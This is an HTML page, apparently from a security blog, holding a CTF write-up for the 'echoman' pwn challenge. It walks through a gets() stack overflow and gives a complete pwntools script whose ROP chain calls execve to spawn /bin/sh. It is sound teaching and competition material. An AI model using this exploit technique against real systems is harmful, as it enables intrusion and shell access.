@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="author" content="deadc0de">
+    <meta name="description" content="deadc0de's blog">
+    <meta name="keywords" content="hacking,security,reverse engineering,exploitation,coding,dev,linux,opensource,">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate"  href="https://deadc0de.re/feeds/all.atom.xml" type="application/atom+xml" title="deadc0de.re Atom Feed"/>
+    <link rel="alternate" href="https://deadc0de.re/feeds/all.rss.xml" type="application/rss+xml" title="deadc0de.re RSS Feed"/>
+    <title>ynotctf19 write-up: echoman // deadc0de.re // </title>
+    <link rel="stylesheet" href="https://deadc0de.re/theme/css/main.css">
+    <link rel="stylesheet" href="https://deadc0de.re/theme/css/pygments.css">
+</head>
+
+<body>
+    <div class="pure-g-r" id="layout">
+        <div class="sidebar pure-u">
+            <div class="cover-img"                   style="background-image: url('/images/logo.png');"
+>
+
+                <div class="cover-body">
+                    <header class="header">
+                        <hgroup>
+                            <h1 class="brand-main"><a href="https://deadc0de.re/">deadc0de.re</a></h1>
+                              <p class="links"><a href="/pages/tags.html">Tags</a></p>
+                              <p class="links"><a href="/pages/archives.html">Archives</a></p>
+
+                                <p class="links"><a href="https://deadc0de.re/pages/about">About</a></p>
+                                <p class="links"><a href="https://deadc0de.re/pages/links">Links</a></p>
+
+                        </hgroup>
+                    </header>
+                </div>
+            </div>
+        </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>ynotctf19 write-up: echoman</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="https://deadc0de.re/tag/ctf.html">ctf</a>
+                                <a class="post-category" href="https://deadc0de.re/tag/pwn.html">pwn</a>
+                                <a class="post-category" href="https://deadc0de.re/tag/write-up.html">write-up</a>
+                                <a class="post-category" href="https://deadc0de.re/tag/rop.html">rop</a>
+                            <br/>
+                            // Fri 15 November 2019
+                        </p>
+                </header>
+            </section>
+            <p>This is a write-up for the <em>echoman</em> pwn of
+<a href="https://www.blackalps.ch/ba-19/ctf.php">Ynotctf CTF at BlackAlps</a>.
+The provided binary can be found
+<a href="https://gitlab.com/deadc0de6/ctf/blob/master/2019-ynotctf-blackalps/echoman/echoman">here</a>.</p>
+<h2>The program</h2>
+<p>The binary is a simple echo server.
+Here the string <em>TEST</em> is entered:</p>
+<div class="highlight"><pre><span></span>$ ./echoman
+Hi my name is Echoman
+Let me echo something for you !
+TEST
+Here iiit iiiis: TEST
+</pre></div>
+
+
+<p>The binary's protections:</p>
+<div class="highlight"><pre><span></span>&gt; checksec
+Canary                        : Yes
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+</pre></div>
+
+
+<h2>The vulnerabilities</h2>
+<p>Using <a href="https://ghidra-sre.org/">Ghidra</a> one gets quickly an overview of
+the vulnerability in the <code>echoman</code> function:</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">echoman</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Let me echo something for you !&quot;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here iiit iiiis: %s&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>We can overflow the <code>buf</code> buffer and take control of the program.</p>
+<p>Using gdb, one can see how much we need to
+write in order to reach <em>saved rip</em>.</p>
+<div class="highlight"><pre><span></span>&gt; disas echoman
+Dump of assembler code for function echoman:
+   0x0000000000401d38 &lt;+0&gt;: push   rbp
+   0x0000000000401d39 &lt;+1&gt;: mov    rbp,rsp
+   0x0000000000401d3c &lt;+4&gt;: add    rsp,0xffffffffffffff80
+   0x0000000000401d40 &lt;+8&gt;: lea    rdi,[rip+0x7f2c1]        # 0x481008
+   0x0000000000401d47 &lt;+15&gt;:    call   0x410550 &lt;puts&gt;
+   0x0000000000401d4c &lt;+20&gt;:    lea    rax,[rbp-0x80]
+   0x0000000000401d50 &lt;+24&gt;:    mov    rdi,rax
+   0x0000000000401d53 &lt;+27&gt;:    mov    eax,0x0
+   0x0000000000401d58 &lt;+32&gt;:    call   0x410260 &lt;gets&gt;
+   0x0000000000401d5d &lt;+37&gt;:    lea    rax,[rbp-0x80]
+   0x0000000000401d61 &lt;+41&gt;:    mov    rsi,rax
+   0x0000000000401d64 &lt;+44&gt;:    lea    rdi,[rip+0x7f2bd]        # 0x481028
+   0x0000000000401d6b &lt;+51&gt;:    mov    eax,0x0
+   0x0000000000401d70 &lt;+56&gt;:    call   0x408fa0 &lt;printf&gt;
+   0x0000000000401d75 &lt;+61&gt;:    nop
+   0x0000000000401d76 &lt;+62&gt;:    leave
+   0x0000000000401d77 &lt;+63&gt;:    ret
+End of assembler dump.
+</pre></div>
+
+
+<p>So we need to push 128 bytes (<code>0xffffffffffffff80 = -128</code>)
+to overwrite the buffer, then
+8 bytes to overwrite <em>saved rbp</em> (<code>push rbp</code>)
+and finally 8 bytes to overwrite
+<em>saved rip</em> and take control of the flow</p>
+<div class="highlight"><pre><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*128 + &quot;B&quot;*8 + &quot;C&quot;*8)&#39;</span>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
+</pre></div>
+
+
+<p>Generating that in Python and then feeding it to the program
+shows us in gdb that the <em>saved rip</em> is overwritten
+by <code>C</code>s</p>
+<div class="highlight"><pre><span></span>&gt; info frame
+Stack level 0, frame at 0x7fffffffe340:
+ rip = 0x401d75 in echoman; saved rip = 0x4343434343434343
+ called by frame at 0x7fffffffe348
+ Arglist at 0x7fffffffe330, args:
+ Locals at 0x7fffffffe330, Previous frame&#39;s sp is 0x7fffffffe340
+ Saved registers:
+  rbp at 0x7fffffffe330, rip at 0x7fffffffe338
+</pre></div>
+
+
+<h2>Exploit</h2>
+<p>So we simply need to overflow (128+8 bytes) and then
+write our ROP chain to exploit it.</p>
+<p>Ropper was able to automatically generate a working
+ROP chain:</p>
+<div class="highlight"><pre><span></span>$ ropper -f echoman --chain execve
+</pre></div>
+
+
+<p>It is clearly nicer to build the ROP chain manually
+but due to time constraints <code>ropper</code> provided us
+a nice working solution.</p>
+<p>Here's the complete pwntools script to exploit it:</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;./echoman&#39;</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;pwns.blackalps.lan&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">2004</span>
+
+<span class="c1">#proc = remote(host, port)</span>
+<span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;started ...&#39;</span><span class="p">)</span>
+
+<span class="n">query</span> <span class="o">=</span> <span class="s1">&#39;Let me echo something for you !&#39;</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;Q&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+
+<span class="n">IMAGE_BASE_0</span> <span class="o">=</span> <span class="mh">0x0000000000400000</span> <span class="c1"># 2d2f5423e4ac9faa4d94827cb210852f4fc1505e432b58994704d6c2fe66b116</span>
+<span class="n">rebase_0</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">IMAGE_BASE_0</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000000000000327d</span><span class="p">)</span> <span class="c1"># 0x000000000040327d: pop r13; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;//bin/sh&#39;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0000000000001f9b</span><span class="p">)</span> <span class="c1"># 0x0000000000401f9b: pop rbx; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000aa0e0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000000000005c3a5</span><span class="p">)</span> <span class="c1"># 0x000000000045c3a5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000000000000327d</span><span class="p">)</span> <span class="c1"># 0x000000000040327d: pop r13; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0000000000000000</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0000000000001f9b</span><span class="p">)</span> <span class="c1"># 0x0000000000401f9b: pop rbx; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000aa0e8</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000000000005c3a5</span><span class="p">)</span> <span class="c1"># 0x000000000045c3a5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000000000000182a</span><span class="p">)</span> <span class="c1"># 0x000000000040182a: pop rdi; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000aa0e0</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000079be</span><span class="p">)</span> <span class="c1"># 0x00000000004079be: pop rsi; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000aa0e8</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000722db</span><span class="p">)</span> <span class="c1"># 0x00000000004722db: pop rdx; pop rbx; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00000000000aa0e8</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0000000000046a20</span><span class="p">)</span> <span class="c1"># 0x0000000000446a20: pop rax; ret;</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x000000000000003b</span><span class="p">)</span>
+<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0000000000015244</span><span class="p">)</span> <span class="c1"># 0x0000000000415244: syscall; ret;</span>
+
+<span class="n">string</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">128</span>
+<span class="n">string</span> <span class="o">+=</span> <span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">string</span> <span class="o">+=</span> <span class="n">rop</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+
+<span class="c1"># profit</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
+<span class="n">proc</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+<footer class="footer">
+    <p>
+    &copy; 2015 deadc0de
+    <br/>
+    <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0;vertical-align:middle;" src="/images/ccby.png" /></a>
+    This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </p>
+</footer>        </div>
+    </div>
+    </div>
+</body>
+</html>
